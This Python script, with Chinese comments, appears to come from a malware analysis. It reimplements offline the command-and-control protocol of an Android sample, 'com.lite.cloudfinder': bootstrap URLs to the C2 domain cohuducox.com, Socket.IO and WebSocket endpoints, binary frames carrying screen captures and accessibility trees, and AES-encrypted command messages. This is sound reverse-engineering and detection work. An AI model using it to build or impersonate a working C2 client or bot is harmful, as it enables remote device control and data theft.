#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
c2_protocol.py — com.lite.cloudfinder (apkid=10068) C2 协议离线模型 / 校验器

本脚本不主动连接任何服务器（默认离线）。它把逆向得到的协议精确重实现，用于：
  1) 生成与样本完全一致的引导 URL、Socket.IO URI、二进制帧、握手包；
  2) 解析帧 dump / 解密 token 与消息，验证抓包与源码推断是否自洽；
  3) 作为协议文档的可执行附录（规范与实现同源）。

协议要点（全部来自 classes.dex 反编译源码，见 report/02-通信协议.md）：
  引导   GET https://www.cohuducox.com/adv.php?apk=10068&device=<android_id>
         -> {"token": "<base64(AES-ECB-PKCS5(JSON))>"}
         -> {"host": "...", "domain": "cohuducox.com", "port": "3000"}
  Socket.IO  https://{host}:{port}/io{port}
             ?apkid=10068&line={token}&cmode=test&device={android_id}&ver=v4.0
             事件: login / deviceOnline / "enc msg"(发) / new_msg(收) / webrtc*
  二进制 WS  wss://{host}:443/ws/binary-device?deviceId=<android_id>
             帧 = [1B type][4B big-endian len][len B payload]
             48 握手 {"deviceId":"..","apkId":10068} / 16 指令 JSON / 1,2,4,6,7 数据 / 33 pong
"""
import sys, struct, json, argparse, os

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from c2_crypt import decrypt, encrypt, KEY  # noqa: E402

APK_ID = 10068
BOOTSTRAP = "https://www.cohuducox.com/adv.php?apk={apk}&device={device}"
WS_PATH = "/ws/binary-device?deviceId={device}"
SIO_QUERY = "apkid={apk}&line={line}&cmode=test&device={device}&ver={ver}"
SIO_VER = "v4.0"

# 二进制帧类型（Opcode）
OP = {
    1: "SCREEN_FRAME  屏幕帧(JPEG)                        [S->C? 否，C->S]",
    2: "A11Y_TREE     无障碍 UI 树(gzip+base64 XML)         [C->S]",
    4: "THUMB         缩略截图(JPEG)                        [C->S]",
    6: "HD_FRAME      HD 串流帧                            [C->S]",
    7: "ADB_TREE      adb uiautomator 树(gzip+base64 XML)   [C->S]",
    16: "COMMAND       服务端指令 JSON                       [S->C]",
    33: "PONG          心跳应答                              [S->C]",
    48: "HELLO         设备握手 JSON                         [C->S]",
}


def build_bootstrap_url(device_id):
    return BOOTSTRAP.format(apk=APK_ID, device=device_id)


def parse_token(token_b64):
    """token 是 AES-ECB-PKCS5+Base64 的 JSON，解出 host/domain/port。"""
    obj = json.loads(decrypt(token_b64))
    host = obj.get("host", "www")
    domain = obj.get("domain", "cohuducox.com")
    port = int(obj.get("port", "3000"))
    if "." not in host:
        host = host + "." + domain
    return {"host": host, "port": port, "token": token_b64, "raw": obj}


def build_sio_uri(host, port, device_id, token_b64):
    return "https://%s:%d/io%d?%s" % (
        host, port, port,
        SIO_QUERY.format(apk=APK_ID, line=token_b64, device=device_id, ver=SIO_VER))


def build_ws_url(host, device_id):
    return "wss://%s:443%s" % (host, WS_PATH.format(device=device_id))


def frame(op, payload=b""):
    if isinstance(payload, str):
        payload = payload.encode("utf-8")
    return bytes([op]) + struct.pack(">I", len(payload)) + payload


def parse_frames(buf):
    out, i = [], 0
    while i + 5 <= len(buf):
        op = buf[i]
        n = struct.unpack(">I", buf[i + 1:i + 5])[0]
        if i + 5 + n > len(buf):
            out.append((op, None, "truncated: need %d bytes, have %d" % (n, len(buf) - i - 5)))
            break
        out.append((op, buf[i + 5:i + 5 + n], None))
        i += 5 + n
    return out


def hello_packet(device_id):
    return frame(48, json.dumps({"deviceId": device_id, "apkId": APK_ID},
                                separators=(",", ":")))


def enc_msg(action, data):
    """Socket.IO 出站: emit('enc msg', base64(AES(JSON)))"""
    envelope = {"action": action, "type": "enc"}
    if data is not None:
        envelope["data"] = data
    return encrypt(json.dumps(envelope, separators=(",", ":")))


def decode_new_msg(payload):
    """Socket.IO 入站: new_msg -> 解密 -> {action, data}"""
    obj = json.loads(decrypt(payload))
    return {"action": obj.get("action", ""), "data": obj.get("data", obj)}


def show_frame(op, payload):
    name = OP.get(op, "UNKNOWN")
    if payload is None:
        print("  op=%-3d %s" % (op, name))
        return
    print("  op=%-3d %-28s len=%d" % (op, name.split()[0], len(payload)))
    try:
        if op in (16, 48):
            print("      json:", json.dumps(json.loads(payload.decode("utf-8")),
                                           ensure_ascii=False))
        elif op == 33:
            print("      payload:", payload.hex())
        else:
            print("      head:", payload[:24].hex())
    except Exception as e:
        print("      (non-json payload)", e)


def main():
    ap = argparse.ArgumentParser(description="com.lite.cloudfinder C2 协议离线模型")
    ap.add_argument("--device", default="ANDROID_ID_PLACEHOLDER",
                    help="设备 android_id (Settings.Secure android_id)")
    ap.add_argument("--token", help="adv.php 返回的 token(Base64)，用于还原 host/port/URI")
    ap.add_argument("--frames-hex", help="二进制帧 dump 的十六进制串，用于解析")
    ap.add_argument("--new-msg", help="捕获到的 new_msg 密文，用于解密")
    ap.add_argument("--action", help="构造一条出站 enc msg，例如 deviceOnline")
    ap.add_argument("--data", help="配合 --action 的 JSON 数据")
    a = ap.parse_args()

    print("== 引导阶段")
    print("  GET", build_bootstrap_url(a.device))

    host, port, token = "www.cohuducox.com", 3000, "TOKEN_PLACEHOLDER"
    if a.token:
        info = parse_token(a.token)
        host, port, token = info["host"], info["port"], info["token"]
        print("  解密 token:", json.dumps(info["raw"], ensure_ascii=False))
        print("  -> host=%s port=%d" % (host, port))
    else:
        print("  (未提供 --token，使用占位值)")

    print("\n== Socket.IO 通道")
    print("  URI   ", build_sio_uri(host, port, a.device, token))
    print("  emit  ", "login", '->', a.device)
    print("  emit  ", "deviceOnline", "->", json.dumps(
        {"deviceId": a.device, "pkg": "android", "apps": None, "mails": None,
         "deviceInfo": "{...}", "wallpaper": "<base64 jpeg>"}, ensure_ascii=False))
    print("  emit  ", "enc msg", "<base64 AES>")
    print("  on    ", "new_msg / webrtcOffer / webrtcIce / webrtcStop")

    print("\n== 二进制 WebSocket 通道")
    print("  URL   ", build_ws_url(host, a.device))
    h = hello_packet(a.device)
    print("  握手帧 ", h[:5].hex(), "->", h[5:].decode())

    if a.action:
        data = json.loads(a.data) if a.data else None
        print("\n== 出站加密消息 (enc msg)")
        print("  ", enc_msg(a.action, data))

    if a.frames_hex:
        buf = bytes.fromhex(a.frames_hex.replace(" ", "").replace("\n", ""))
        print("\n== 帧解析 (%d bytes)" % len(buf))
        for op, payload, err in parse_frames(buf):
            show_frame(op, payload)
            if err:
                print("      !!", err)
            if op == 16 and payload:
                cmd = json.loads(payload.decode("utf-8"))
                print("      action=%r data=%s" % (cmd.get("action"),
                                                   json.dumps(cmd.get("data"), ensure_ascii=False)[:200]))

    if a.new_msg:
        print("\n== new_msg 解密")
        print("  ", json.dumps(decode_new_msg(a.new_msg), ensure_ascii=False))

    print("\n== 帧类型表")
    for k in sorted(OP):
        print("  %-3d %s" % (k, OP[k]))
    return 0


if __name__ == "__main__":
    sys.exit(main())
